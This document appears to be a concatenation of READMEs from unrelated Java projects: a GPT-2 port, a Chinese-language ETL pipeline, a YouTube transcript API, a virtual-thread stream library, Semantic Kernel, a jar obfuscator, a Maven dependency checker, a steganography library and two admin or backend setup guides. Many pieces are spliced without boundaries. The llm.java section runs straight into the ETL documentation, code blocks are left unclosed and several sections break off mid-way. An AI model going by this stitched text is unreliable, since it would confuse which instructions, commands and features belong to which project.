harryjackson/llm.java,main,"# llm.java

Large Language Model (LLM) example in java i.e. GPT2. This is a port of 
the [Llm.c code that lives here](https://github.com/karpathy/llm.c) written 
by @[karpathy](https://github.com/karpathy) 

## Before Running ChatGPT2 in Java

Before attempting to run this some prep work needs to happen. If you check 
the [llm.c repository](https://github.com/karpathy/llm.c) these steps are very similar. 
The reason the same code is in this repository is because LLM.c is still a moving target.

I highly recommend running the original llm.c to see it work. It's wonderful.

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python prepro_tinyshakespeare.py
python train_gpt2.py
```

### JVM Requirements

I used the GraalVM for this running version 21. If you're using sdkman.

```bash
sdk default java 21.0.2-graalce
```

I tested the following JVM version and they all seem to work. I have not investigated why some are slower than 
others.

1. Temurin: This ran at half the speed of Graal. I stopped it at step 10

```bash
sdk install java 21-tem
sdk use java 21-tem
```

2. Correto: This VM was also really slow compared to Graal. So I stopped it after step 10

```bash
sdk install java 21.0.3-amzn
sdk use java 21.0.3-amzn
```


## Running

Note the arguments passed to the JVM. Of particular note is ""-Djava.util.concurrent.ForkJoinPool.common.parallelism=10"", 
adjust this based on how many cores you have. The matrix multiplication methods are entirely CPU bound so adding more
threads than cores will just slow things down. 

```bash
mvn clean install;
java -jar -ea --add-modules jdk.incubator.vector --enable-preview -Xmx8g -Djava.util.concurrent.ForkJoinPool.common.parallelism=10 target/gpt2-1.0-SNAPSHOT.jar
```

## Performance

I've made no attempt to tune this for performance. The C version is still much faster than this version. There are 
some low-hanging fruit like parallelizing some of the loops. I made the matmul_forward and matmul_backward both 
parallel because it was painfully slow without it.

![image](https://github.com/WolfLink-DevTeam/lite-etl/blob/master/img/Pipeline%20Architecture.png)
### Pre Processor
当订阅者从数据源获取到数据后，会优先将数据交给数据预处理器进行处理。
Lite ETL 默认提供了两种类型的数据预处理器：
- Data Splitter：将输入的文档按照一定规则拆分成若干个文档，以便于后续进行处理。
- Update Time Finder：更新时间查找者，指定一个能够获取到文档更新时间的规则，以便于在拉取数据时进行比对，差量更新。
### Subscriber
定义了从数据源获取数据的具体方式。
Lite ETL 默认提供了一种类型的数据订阅者：
- Polling Subscriber：按照一定的周期轮询订阅数据。
### Transformer
对数据进行详细处理或类型转换的组件，即为转换器。多个转换器按照特定顺序可组合为转换器组。按照组的规格应用至管道。
Lite ETL 默认提供了一种类型的转换器组：
- LLM Transformer Group：基于 LLM + Prompt 对数据进行处理，包含了 Data Formatter、Value Filter、Fuzzy Extractor、Final Verifier 四种转换器。
- Data Formatter：依据格式化字典，对输入数据进行规范化词典替换。
- Value Filter：判定数据对于特定领域的分析是否具有价值。
- Fuzzy Extractor：基于认知模型对数据进行模糊提取。
- Final Verifier：对数据进行最终校验，判断数据在转换过程中是否存在异常。
### Writer
对数据进行输出，用户可以自行定义多种类型的数据写入者，将数据以各种不同形式进行输出。
## 快速使用
```java
public class Example {
    public static void main(String[] args) {
        // 启用 LLM 模型能力
        ETLConfig.getInstance().enableLLM(
                ""base-url"",
                ""sk-xxxxxx"",
                ModelSource.OPEN_AI,
                ""gpt-3.5-turbo""
        );
        // 规范化字典(可选)
        FormatDictionary dictionary = new FormatDictionary();
        // 管道对象
        Pipeline pipeline = Pipeline.builder()
                // 数据源
                .source(new TestSource())
                // 数据订阅者
                .subscriber(new PollingSubscriber())
                // 转换器组，包含一系列预先实现并按顺序绑定的转换器
                .transformerGroup(new LLMTransformerGroup(dictionary))
                // 数据写入者
                .writer(new ConsoleWriter())
                // 创建管道
                .build();
        // 开通管道，开始持续处理数据
        pipeline.open();
        // 关闭管道，不再接收并处理新的数据
        pipeline.close();
    }
}

## ⚠️WARNING ⚠️

### This library uses undocumented YouTube API, so it's possible that it will stop working at any time. Use at your own risk.

## 📖 Introduction

Java library which allows you to retrieve subtitles/transcripts for a YouTube video.
It supports manual and automatically generated subtitles, bulk transcript retrieval for all videos in the playlist or
on the channel and does not use headless browser for scraping.
Inspired by [Python library](https://github.com/jdepoix/youtube-transcript-api).

## 🤖 Features

✅ Manual transcripts retrieval

✅ Automatically generated transcripts retrieval

✅ Bulk transcript retrieval for all videos in the playlist or channel

✅ Transcript translation

✅ Transcript formatting

✅ Easy-to-use API

✅ Supports Java 11 and above

## 🛠️ Installation

### Maven

```xml

<dependency>
    <groupId>io.github.thoroldvix</groupId>
    <artifactId>youtube-transcript-api</artifactId>
    <version>0.3.6</version>
</dependency>
```

### Gradle

```groovy
implementation 'io.github.thoroldvix:youtube-transcript-api:0.3.6'
```

### Gradle (kts)

```kotlin
implementation(""io.github.thoroldvix:youtube-transcript-api:0.3.6"")
```

## 🔰 Getting Started

To start using YouTube Transcript API, you need to create an instance of `YoutubeTranscriptApi` by
calling `createDefault`
method of `TranscriptApiFactory`. Then you can call `listTranscripts` to get a list of all available transcripts for a
video:

```java
// Create a new default YoutubeTranscriptApi instance
YoutubeTranscriptApi youtubeTranscriptApi = TranscriptApiFactory.createDefault();

// Retrieve all available transcripts for a given video
TranscriptList transcriptList = youtubeTranscriptApi.listTranscripts(""videoId"");
```

`TranscripList` is an iterable which contains all available transcripts for a video and provides methods
for [finding specific transcripts](#find-transcripts) by language or by type (manual or automatically generated).

```java
TranscriptList transcriptList = youtubeTranscriptApi.listTranscripts(""videoId"");

// Iterate over transcript list
for(Transcript transcript : transcriptList) {
        System.out.println(transcript);
}

// Find transcript in specific language
Transcript transcript = transcriptList.findTranscript(""en"");

// Find manually created transcript
Transcript manualyCreatedTranscript = transcriptList.findManualTranscript(""en"");

// Find automatically generated transcript
Transcript automaticallyGeneratedTranscript = transcriptList.findGeneratedTranscript(""en"");
```

`Transcript` object contains [transcript metadata](#transcript-metadata) and provides methods for translating the
transcript to another language
and fetching the actual content of the transcript.

```java
Transcript transcript = transcriptList.findTranscript(""en"");

// Translate transcript to another language
Transcript translatedTranscript = transcript.translate(""de"");

// Retrieve transcript content
TranscriptContent transcriptContent = transcript.fetch();
```

`TranscriptContent` contains actual transcript content, storing it as a list of `Fragment`.
Each `Fragment` contains 'text', 'start' and 'duration'
attributes. If you try to print the `TranscriptContent`, you will get the output looking like this:

```text
content=[{text='Text',start=0.0,dur=1.54},{text='Another text',start=1.54,dur=4.16}]
```

> **Note:** If you want to get transcript content in a different format, refer
> to [Use Formatters](#use-formatters).

You can also use `getTranscript`:

```java
TranscriptContent transcriptContent = youtubeTranscriptApi.getTranscript(""videoId"", ""en"");
```

This is equivalent to:

```java
TranscriptContent transcriptContent = youtubeTranscriptApi.listTranscripts(""videoId"")
        .findTranscript(""en"")
        .fetch();
```

Given that English is the most common language, you can omit the language code, and it will default to English:

```java
// Retrieve transcript content in english
TranscriptContent transcriptContent = youtubeTranscriptApi.listTranscripts(""videoId"")
        //no language code defaults to english
        .findTranscript()
        .fetch();
// Or
TranscriptContent transcriptContent = youtubeTranscriptApi.getTranscript(""videoId"");
```

For bulk transcript retrieval see [Bulk Transcript Retrieval](#bulk-transcript-retrieval).

## 🔧 Detailed Usage

### Use fallback language

In case if desired language is not available, instead of getting an exception you can pass some other languages that
will be used as a fallback.

For example:

```java
TranscriptContent transcriptContent = youtubeTranscriptApi.listTranscripts(""videoId"")
        .findTranscript(""de"", ""en"")
        .fetch();

// Or
TranscriptContent transcriptContent = youtubeTranscriptApi.getTranscript(""videoId"", ""de"", ""en"");
```

It will first look for a transcript in German, and if it doesn't find one, it will then look for one in English, and so
on.

### Find transcripts

By default, `findTranscript` will always pick manually created transcripts first and then automatically generated ones.
If you want to get only automatically generated or only manually created transcripts, you can use `findManualTranscript`
or `findGeneratedTranscript`.

```java
// Retrieve manually created transcript
Transcript manualyCreatedTranscript = transcriptList.findManualTranscript(""en"");

// Retrieve automatically generated transcript
Transcript automaticallyGeneratedTranscript = transcriptList.findGeneratedTranscript(""en"");
```

`findGeneratedTranscript` and `findManualTranscript` both
support [fallback languages](#use-fallback-language).

### Transcript metadata

`Transcript` object contains several methods for retrieving transcript metadata:

```java
String videoId = transcript.getVideoId();

String language = transcript.getLanguage();

String languageCode = transcript.getLanguageCode();

// API URL used to fetch transcript content
String apiUrl = transcript.getApiUrl();

// Whether it has been manually created or automatically generated by YouTube
boolean isGenerated = transcript.isGenerated();

// Whether this transcript can be translated or not
boolean isTranslatable = transcript.isTranslatable();

// Set of language codes which represent available translation languages
Set<String> translationLanguages = transcript.getTranslationLanguages();
```

### Use Formatters

By default, if you try to print `TranscriptContent` it will return the following string representation:

```text
content=[{text='Text',start=0.0,dur=1.54},{text='Another text',start=1.54,dur=4.16}]
```

Since this default format may not be suitable for all scenarios, you can implement the `TranscriptFormatter` interface
to customize the formatting of the content.

```java
// Create a new custom formatter
Formatter transcriptFormatter = new MyCustomFormatter();

// Format transcript content
String formattedContent = transcriptFormatter.format(transcriptContent);
```

The library offers several built-in formatters:

- `JSONFormatter` - Formats content as JSON
- `JSONPrettyFormatter` - Formats content as pretty-printed JSON
- `TextFormatter` - Formats content as plain text without timestamps
- `WebVTTFormatter` - Formats content as [WebVTT](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API)
- `SRTFormatter` - Formats content as [SRT](https://www.3playmedia.com/blog/create-srt-file/)

These formatters can be accessed from the `TranscriptFormatters` class:

```java
// Get json formatter
TranscriptFormatter jsonFormatter = TranscriptFormatters.jsonFormatter();

String formattedContent = jsonFormatter.format(transcriptContent);
````

### YoutubeClient Customization and Proxy

By default, `YoutubeTranscriptApi` uses Java 11 HttpClient for making requests to YouTube, if you want to use a
different client or use a proxy,
you can create your own YouTube client by implementing the `YoutubeClient` interface and passing it to
the `TranscriptApiFactory` `createWithClient` method.

```java
// Create a new custom YoutubeClient
YoutubeClient youtubeClient = new MyCustomYoutubeClient();

// Create YoutubeTranscriptApi instance with custom YouTubeClient
YoutubeTranscriptApi youtubeTranscriptApi = TranscriptApiFactory.createWithClient(youtubeClient);
```

### Cookies

Some videos may be age-restricted, requiring authentication to access the transcript.
To achieve this, obtain access to the desired video in a browser and download the cookies in Netscape format, storing
them as a TXT file.
You can use extensions
like [Get cookies.txt LOCALLY](https://chromewebstore.google.com/detail/get-cookiestxt-locally/cclelndahbckbenkjhflpdbgdldlbecc)
for Chrome or [cookies.txt](https://addons.mozilla.org/en-US/firefox/addon/cookies-txt/) for Firefox to do this.
`YoutubeTranscriptApi` contains `listTranscriptsWithCookies` and `getTranscriptWithCookies` which accept a path to the
cookies.txt file.

```java
// Retrieve transcript list
TranscriptList transcriptList = youtubeTranscriptApi.listTranscriptsWithCookies(""videoId"", ""path/to/cookies.txt"");

// Get transcript content
TranscriptContent transcriptContent = youtubeTranscriptApi.getTranscriptWithCookies(""videoId"", ""path/to/cookies.txt"", ""en"");
```

### Bulk Transcript Retrieval

There are a few methods for bulk transcript retrieval in `YoutubeTranscriptApi` 

Playlists and channels information is retrieved from
the [YouTube V3 API](https://developers.google.com/youtube/v3/docs/),
so you will need to provide API key for all methods.

All methods take a `TranscriptRequest` object as a parameter,
which contains the following fields:

- `apiKey` - YouTube API key.
- `stopOnError`(optional, defaults to `true`) - Whether to stop on the first error or continue. If true, the method will
  fail fast by throwing an error if one of the transcripts could not be retrieved,
  otherwise it will ignore failed transcripts.

- `cookies` (optional) - Path to [cookies.txt](#cookies) file.

All methods return a map which contains the video ID as a key and the corresponding result as a value.

```java
// Create a new default PlaylistsTranscriptApi instance
YoutubeTranscriptApi youtubeTranscriptApi = TranscriptApiFactory.createDefault();

//Create request object
TranscriptRequest request = new TranscriptRequest(""apiKey"");

// Retrieve all available transcripts for a given playlist
Map<String, TranscriptList> transcriptLists = youtubeTranscriptApi.listTranscriptsForPlaylist(""playlistId"", request);

// Retrieve all available transcripts for a given channel
Map<String, TranscriptList> transcriptLists = youtubeTranscriptApi.listTranscriptsForChannel(""channelName"", request);
```

Same as with the `getTranscript` method, you can also fetch transcript content directly
using [fallback languages](#use-fallback-language) if needed.

```java
//Create request object
TranscriptRequest request = new TranscriptRequest(""apiKey"");

// Retrieve transcript content for all videos in a playlist
Map<String, TranscriptContent> transcriptLists = youtubeTranscriptApi.getTranscriptsForPlaylist(""playlistId"", request);

// Retrieve transcript content for all videos in a channel
Map<String, TranscriptContent> transcriptLists = youtubeTranscriptApi.getTranscriptsForChannel(""channelName"", request, ""en"", ""de"");
```

> **Note:** If you want to get transcript content in a different format, refer
> to [Use Formatters](#use-formatters).

## 🤓 How it works

Within each YouTube video page, there exists JSON data containing all the transcript information, including an
undocumented API URL embedded within its HTML. This JSON looks like this:

```json
{
  ""captions"": {
    ""playerCaptionsTracklistRenderer"": {
      ""captionTracks"": [
        {
          ""baseUrl"": ""https://www.youtube.com/api/timedtext?v=dQw4w9WgXcQ&asr_langs=de,en,es,fr,it,ja,ko,nl,pt,ru&caps=asr&xorp=true&hl=de&ip=0.0.0.0&ipbits=0&expire=1570645639&sparams=ip,ipbits,expire,v,asr_langs,caps,xorp&signature=5939E534881E9A14C14BCEDF370DE7A4E5FD4BE0.01ABE3BA9B2BCDEC6C51D6A9D9F898460495F0F2&key=yt8&lang=de"",
          ""name"": {
            ""simpleText"": ""Deutsch""
          },
          ""vssId"": "".de"",
          ""languageCode"": ""de"",
          ""isTranslatable"": true
        },
        {
          ""baseUrl"": ""https://www.youtube.com/api/timedtext?v=dQw4w9WgXcQ&asr_langs=de,en,es,fr,it,ja,ko,nl,pt,ru&caps=asr&xorp=true&hl=de&ip=0.0.0.0&ipbits=0&expire=1570645639&sparams=ip,ipbits,expire,v,asr_langs,caps,xorp&signature=5939E534881E9A14C14BCEDF370DE7A4E5FD4BE0.01ABE3BA9B2BCDEC6C51D6A9D9F898460495F0F2&key=yt8&lang=en"",
          ""name"": {
            ""simpleText"": ""Englisch""
          },
          ""vssId"": "".en"",
          ""languageCode"": ""en"",
          ""kind"": ""asr"",
          ""isTranslatable"": true
        }
      ],
      ""translationLanguages"": [
        {
          ""languageCode"": ""af"",
          ""languageName"": {
            ""simpleText"": ""Afrikaans""
          }
        }
      ]
    }
  }
}
```

This library works by making a single GET request to the YouTube page of the specified video, extracting the JSON data
from the HTML, and parsing it to obtain a list of all available transcripts. To fetch the transcript content, it then
sends a GET request to the API URL extracted from the JSON. The YouTube API returns the transcript content in XML
format, like this:

```xml
<?xml version=""1.0"" encoding=""utf-8"" ?>
<transcript>
    <text start=""0"" dur=""1.54"">Some text</text>
    <text start=""1.54"" dur=""4.16"">Some additional text</text>
</transcript>
```

YunaBraska/streamline,main,"# StreamLine

StreamLine is an enhanced Java Stream API optimized for concurrent processing, leveraging the power of Project Loom's
virtual threads. Designed to provide superior performance in multithreaded environments, it simplifies the usage of
streams without the common pitfalls of resource management in standard Java streams.

![Label][label_shield]
![Label][java_version]

## Motivation

Traditional Java streams are powerful but also come with big limits cause of the shared ForkedJoinPool which is not
replaceable and also not programmatically configurable.
Java's parallel streams start blocking each other in concurrent environments, leading to performance bottlenecks.
Therefore, StreamLine was created to address these shortcomings.

### Benefits

- **High-Performance Streaming**: Takes full advantage of Project Loom's virtual threads for efficient non-blocking
  concurrency.
- **Simple API**: Offers a straightforward approach to parallel and asynchronous streaming operations.
- **Resource Management**: Designed to avoid typical issues related to stream resource management, ensuring cleaner and
  safer code.
- **Enhanced Scalability**: Performs exceptionally well under high-load conditions, scaling effectively across multiple
  cores.
- **Pure Java**: No external dependencies for a lightweight integration.
- **Functional Design**: Embraces modern Java functional paradigms.
- **No Reflection**: Ensures compatibility with GraalVM native images.

### Prerequisites

* Java 21 or later and for using Project Loom

### Usage

```java
import berlin.yuna.streamline.model.StreamLine;

public class Example {
    public static void main(final String[] args) {
        StreamLine.of(""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

With custom thread pool:

```java
import berlin.yuna.streamline.model.StreamLine;

import java.util.concurrent.ForkJoinPool;

public class Example {
    public static void main(final String[] args) {
        final ForkJoinPool executor = new ForkJoinPool();
        
        StreamLine.of(executor, ""one"", ""two"", ""three"")
            .threads(-1) // Use unlimited threads
            .forEach(System.out::println);
    }
}
```

### StreamLine Performance

Each method is tested with 10 concurrent streams including 10 tasks for every stream.
CPU cores: 10.

| Method                    | Time  |
|---------------------------|-------|
| Loop \[for]               | 1.86s |
| Java Stream \[Sequential] | 1.86s |
| Java Stream \[Parallel]   | 724ms |
| StreamLine \[Ordered]     | 118ms |
| StreamLine \[Unordered]   | 109ms |
| StreamLine \[2 Threads]   | 512ms |

### Limitations
* StreamLine is not compatible with Java 8
* StreamLine is mainly made for big data processing and not for small data
* The concurrent processing does not extend to operations returning type-specific streams
  like `IntStream`, `LongStream`, `DoubleStream`, `OptionalInt`, `OptionalLong`, `OptionalDouble`, etc.
* StreamLine has more terminal operations than the usual java stream due its simple design - not sure if this is an advantage or disadvantage ^^

# Semantic Kernel for Java

Welcome to the Semantic Kernel for Java. For detailed documentation, visit [Microsoft Learn](https://learn.microsoft.com/en-us/semantic-kernel/overview/?tabs=Java&pivots=programming-language-java).

[Semantic Kernel](https://learn.microsoft.com/en-us/semantic-kernel/overview/) is an SDK that integrates Large Language Models (LLMs) like [OpenAI](https://platform.openai.com/docs/introduction), [Azure OpenAI](https://azure.microsoft.com/en-us/products/ai-services/openai-service), and [Hugging Face](https://huggingface.co/)
with conventional programming languages like C#, Python, and Java. Semantic Kernel achieves this by allowing you to define [plugins](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/plugins??tabs=Java&pivots=programming-language-java) that can be chained together in just a [few lines of code](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Java&pivots=programming-language-java#using-the-runasync-method-to-simplify-your-code).

What makes Semantic Kernel _special_, however, is its ability to _automatically_ orchestrate plugins with AI. With Semantic Kernel [planners](https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/planner?tabs=Java&pivots=programming-language-java), you can ask an LLM to generate a plan that achieves a user's unique goal. Afterwards, Semantic Kernel will execute the plan for the user.

[前往下载](https://github.com/jar-analyzer/jar-obfuscator/releases/latest)

从 `0.2.0` 版本后支持了简单的 `GUI`

```shell
java -jar jar-obfuscator.jar --gui
```

![](img/012.png)

简单命令即可启动（第一次启动将自动生成配置文件）

```shell
java -jar jar-obfuscator.jar --jar test.jar --config config.yaml
```

![](img/011.png)

支持的混淆内容

- 类名混淆（包含引用修改）
- 包名混淆（包含引用修改）
- 方法名混淆（包含引用修改）
- 字段名混淆（包含引用修改）
- 方法内参数名混淆（包含引用修改）
- 删除编译调试信息（删除行号信息）
- 字符串加密运行时解密（使用 `AES` 加密）
- 字符串提取数组混淆（访问数组方式得到字符串）
- 整型常数异或混淆（多重异或的加密）
- 垃圾代码花指令混淆（可指定多级别的混淆）
- 使用某些技巧可以在反编译时隐藏方法
- 使用某些技巧可以在反编译时隐藏字段
- 安全的随机（支持通过 `CPU` 指令获得随机数）
- 基于 `JVMTI` 的字节码加密（beta）

其中 `包含引用修改` 的功能可能因为修改引用导致程序出问题

## 配置

类名/包名/方法名/字段名的混淆需要分析整体项目的依赖引用
- 类名混淆 `enableClassName`
- 包名混淆 `enablePackageName`
- 方法混淆 `enableMethodName`
- 字段混淆 `enableFieldName`

由于需要修改引用，可能出现预期外的情况

以下混淆不修改引用，相对稳定靠谱，如遇报错可以搭配使用以下配置
- 开启 `enableEncryptString` 和 `enableAdvanceString` 加密字符串
- 开启 `enableJunk` 花指令混淆
- 开启 `enableXOR` 对数字进行异或加密

注意：如果 `obfuscatePackage` 和 `rootPackages` 都不配置，其他的配置不会生效（系统不知道需要对哪些类混淆）

**一个新手上手应该做的是**
- `mainClass` 填写你的主类名
- `obfuscatePackage` 填写你需要混淆的包名（必须）
- `rootPackages` 填写你项目的根包（分析和修改引用的范围 必须）
- 其他可选配置**按需配置**即可
- 如果要开启 `enableMethodName` 需要自行调参黑名单

随机数的来源可以配置 `useCpuRDRAND` 参数
- 直接通过 `CPU` 的 `RDRAND` 指令生成
- 使用 `SecureRandom` 生成

```asm
get_rand_int PROC
    mov rdi, rdi
    test rdi, rdi
    je fail
    rdrand eax
    jc success
fail:
    xor eax, eax
    ret
success:
    mov [rdi], eax
    mov eax, 1
    ret
get_rand_int ENDP
```

Giovds/outdated-maven-plugin,main,"# The Outdated Maven Plugin

> Stay up-to-date and secure with The Outdated Maven Plugin!

The Outdated Maven Plugin is a tool designed to help developers identify outdated dependencies in their Maven projects.
By scanning the dependencies of your project, this plugin determines if they are no longer actively maintained
based on a user-defined threshold of inactivity in years. This ensures that your project remains up-to-date with the
latest and most secure versions of its dependencies.

## Usage

You can use the plugin as standalone for a quick check by simply running the following command in your favourite
project:\
`mvn com.giovds:outdated-maven-plugin:check -Dyears=<number_of_years>`

Or you can use the plugin to get the average and total age of all the dependencies in your project:\
`mvn com.giovds:outdated-maven-plugin:average`

Alternatively, you can integrate the plugin into your Maven project by adding the following configuration to your `pom.xml` file:
```xml

<build>
    <plugins>
        <plugin>
            <groupId>com.giovds</groupId>
            <artifactId>outdated-maven-plugin</artifactId>
            <version>1.3.0</version>
            <configuration>
                <!-- The maximum amount of inactive years allowed -->
                <years>1</years>
                <!-- Whether to fail the build if an outdated dependency is found -->
                <shouldFailBuild>false</shouldFailBuild>
            </configuration>
            <executions>
                <execution>
                    <id>outdated-check</id>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>

galliumdata/adumbra,master,"# The Adumbra library
Adumbra is a light-weight Java library that uses
[steganography](https://en.wikipedia.org/wiki/Steganography)
to hide data in bitmaps using a secret key. 
Supported input formats include PNG, JPEG, TIFF, BMP.
Output formats are PNG and TIFF only, because other
formats are lossy and therefore more difficult to support.

Adumbra requires a bitmap with about 500 pixels
for every byte of the secret message, so a bitmap of
500x700 pixels could contain a secret message 
of up to about 700 bytes. The maximum size of the secret
message is 32K bytes.

Adumbra is intended to be used as more of a way
to mark bitmaps in a non-obvious way, rather than as 
an efficient way to transmit large amounts of secret data.

## How does it work?
Adumbra hides a secret message in a bitmap by distributing
the message's bits into the least significant bit of some pixels,
using one color per pixel (R, G or B) in a pattern
determined by the secret key.

Before being encoded into the bitmap, the message is 
encrypted using a secure hash of the secret key.

Adumbra can also randomize the least significant bits 
of other pixels to make it more difficult to determine 
whether the bitmap contains a secret message, and 
how long that message may be. With that option,
even if someone had access to the original bitmap,
they still would not be able to decode the secret message
without the secret key because they could not determine
if a changed bit belongs to the secret message or is just noise.

## How secure is this?
This library has not been reviewed by cryptography experts,
so you should exercise common sense -- do not rely on it
to hide national security secrets.

As always with encryption, the length of the secret key is
important: using a short key is less secure than a longer key.
The randomness of the key is also a factor. In general,
using a secret key of at least 40 random characters should
give you excellent secrecy. If you just want to mark a bitmap in a non-obvious
way without worrying about NSA-level adversaries, 15 or 20
random characters should be plenty.

There are two main obstacles to decoding a secret message:
### Determining that a bitmap contains a message
An attacker who analyzes the modified bitmap may be able to determine
that the bitmap contains some suspicious noise, but it would be
difficult to be certain unless they have access to the original
bitmap.
### Decoding the secret message
Even with the original bitmap, without the secret key, 
an attacker would have a difficult time to
figure out which bits actually belong to the secret message.
Even if they did, they would then have to decrypt the message,
which is encoded using a SHA-512 hash of the secret key.

## Removing the secret message
Keep in mind that it is fairly easy to scramble a secret message
hidden in a bitmap -- all you have to do is save the bitmap
with a bit of compression. In most cases, that will make the
secret message unrecognizable.

## Command line usage
### Encoding a message in a bitmap
```
java -jar adumbra-<version>.jar encode \
    <input-file> \
    <output-file> \
    <message> \
    <key> \
    [<format> [<secure-level>]]
```
- `<input-file>`: a bitmap file. 
Supported input formats are those supported by your Java platform,
and usually include: `png`, `jpeg`, `tiff`, `bmp`
- `<output-file>`: the file in which to write the bitmap 
with the hidden message
- `<message>`: the message to be encoded in the bitmap
- `<key>`: the secret key used to hide the message
- `<format>`: optional, the format of the output file. 
If not specified, the format of the input file will be used,
but only ""png"" and ""tiff"" are allowed because other formats
are lossy.
- `<secure-level>`: optional, an integer between 0 and 2.
Zero means minimum security, no noise is added to the image,
which means, depending on the bitmap, it may be easy to
detect that the image contains secret data, and how long that
data is. One adds some noise, but with some repetition,
making it much more difficult to determine that the bitmap 
contains secret data. Two adds fully random noise, which is
even more secure, but is somewhat slower.

### Example
Encode a message into a bitmap file:
```
java -jar adumbra-0.9.jar encode MyImage.jpeg Output.png \
    ""My secret message"" ""6buovMtowrAuNYw"" png 1
```
## Extract a secret message from a bitmap file:
```
java -jar adumbra-0.8.jar decode Output.png \
""6buovMtowrAuNYw""
```
Output:
```
Hidden message: My secret message
```

## Library usage
This is a stand-alone library, it has no dependencies.

[Javadoc is here](https://javadoc.io/doc/com.galliumdata.adumbra/adumbra/latest/com/galliumdata/adumbra/package-summary.html)

### Maven:
```
<dependency>
    <groupId>com.galliumdata.adumbra</groupId>
    <artifactId>adumbra</artifactId>
    <version>0.9</version>
</dependency>
```
### Encoding in Java
```
Encoder encoder = new Encoder(2);
FileInputStream inStr = new FileInputStream(""MyImage.jpg"");
FileOutputStream outStr = new FileOutputStream(""ModifImage.png"");
byte[] message = ""This is the message"".getBytes(StandardCharsets.UTF_8);
String key = ""This is the secret key"";
encoder.encode(inStr, outStr,  ""png"", message, key, ""png"", 1);
outStr.close();
// Result is in file ModifImage.png
```

### Decoding in Java
```
Decoder decoder = new Decoder();
FileInputStream inStr = new FileInputStream(""ModifImage.png"");
byte[] decoded = decoder.decode(inStr, ""This is the secret key"");
System.out.println(new String(decoded));
// Output: This is the message
```

### 项目简介

Panis: 名为 Pan , is Pan 反过来 `Panis`，同译为：面包。

[`PanisBoot`](https://github.com/paynezhuang/panis-admin) 是一款现代化的后台管理系统脚手架，它基于 Spring Boot 3
框架进行开发。也得益于前端 [`@SoybeanAdmin 1.0.0`](https://github.com/soybeanjs/soybean-admin)
发版后，精致的用户界面和一致的编码，所以得此顺势完善此项目。
在市面上虽然存在众多出色的 Java 后端管理系统框架，但还是决定重复再造一个轮子。

```

#### `common` 和 `infrastructure` 区别

* `common`模块：通常包含通用的工具类、异常定义、常量定义等与业务无关的代码。这些代码可以被整个应用程序共享。
    - 通用工具类，比如日期处理、字符串处理等
    - 通用异常定义，比如业务异常、参数校验异常等
    - 通用常量定义，比如状态码、错误信息等

* `infrastructure`模块：通常包含与基础设施相关的代码，比如数据库访问、缓存、消息队列、配置管理等。这些代码通常是为了支持业务模块的运行而存在的。
    - 数据访问相关的代码，比如数据库连接、ORM框架配置、数据源配置等
    - 缓存相关的代码，比如缓存配置、缓存管理等
    - 消息队列相关的代码，比如消息生产者、消费者配置等
    - 配置管理相关的代码，比如配置加载、动态配置更新等

对于静态类、工具类、异常定义等，你可以根据其功能和作用来判断放入`common`还是`infrastructure`
模块。如果它们是通用的、与业务无关的，可以放入`common`模块；如果它们是为了支持业务模块的基础设施，可以放入`infrastructure`模块。

If you want to see the commands executed by a task, you can use the `--dry-run` option:

    task --dry genie:build

### Verify your environment

To verify your environment is compatible with the project, run the following command:

    task env:verify

### Setup your environment

You can manually setup your environment by following feedback from the `env:verify` task 
or you can run the following command to let us doing the setup:

    task env:setup

The script will install all required tools and dependencies and supports the following package managers:

* [ASDF](https://asdf-vm.com/) - preferred when available as it supports a large set of tools and versions
* [SDKMAN](https://sdkman.io/) - used when ASDF is not available to setup Java
* [Homebrew](https://brew.sh/) - used when others are not available. It will change the default version of the required tools on your system which is why ASDF or SDKMAN are preferred.

## Build and execute automated tests

The project uses [Apache Maven](https://maven.apache.org/) as build tool and [JUnit 5](https://junit.org/junit5/) as test framework.

To build the project without running the tests, run the following command:

    task build

The application is packaged as a [Spring Boot](https://spring.io/projects/spring-boot) executable jar file.
You can find the jar file in the `target` directory, it is compiled in `dev` mode.

To build it in production mode, run the following command:

    task genie:build:prod

To build the project and execute the tests, run the following command:

    task test

## Run Locally

### Environment variables

First create a `.env` file in the root of the project by copying the sample file as follows:

    copy .env.example .env

Update the content of `.env` with the correct values provided by a project administrator.

You can also use `.env` to override the default values from `.env.default`.

You can pass to the application any configuration parameter as described in [Spring Boot documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config). 

One mandatory env variable is GENIE_SECURITY_KEY_SECRET which is used to encrypt the API keys into the database.

The length of this key should be 32 characters (for 256-bit key) to work correctly with the AES encryption algorithm.

The following command will create a 32 characters keys

```
openssl rand -base64 32
``` 

### Start Genie

To start the application, run the following command:

    task start

The application is available at [http://localhost:8080](http://localhost:8080).

Launch in dev mode with hot reload enabled.
Any change in the code will be automatically reloaded.
Frontend code is automatically compiled using [Webpack](https://webpack.js.org/) and **[LiveReload](https://chromewebstore.google.com/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei?hl=fr) is used to reload the page when any change is detected (just install the browser extension and enable it on the website).**
We also advise installing the [Angular DevTools](https://chromewebstore.google.com/detail/angular-devtools/ienfalfjdbdpebioblfackkekamfmbnh) extension to debug the Angular application.

### Production mode

To build and launch the application in production mode, run the following command:

    task start:prod

### Manage the local database manually

You can start it with:

    task db:start

Restart it with:

    task db:restart

Stop it with:

    task db:stop

Check its status with:

    task db:status

Drop its content with:

    task db:drop

Dump its content with:

    task db:dump

### Liquibase Usage

Liquibase is used to manage the database schema.

You can update the database schema with the following command:

    task db:liquibase:update

You can also validate the database schema with the following command:

    task db:liquibase:validate

You can clear the checksums so liquibase can update from a fresh start with the following command:

    task db:liquibase:clear-checksums

By default, liquibase-maven-plugin is configured to target the local DB defined as

    <liquibase.url>jdbc:postgresql://localhost:5432/postgres</liquibase.url>
    <liquibase.username>postgres</liquibase.username>
    <liquibase.password>mysecretpassword</liquibase.password>

#### Liquibase table updates

Make sure to use changesets to add new columns or indexes

for example

     <changeSet id=""20231019-1171"" author=""stephan"">

        <addColumn tableName=""genie_content"">
            <column name=""enable_tags"" type=""boolean"" defaultValue=""false"">
                <constraints nullable=""true"" />
            </column>
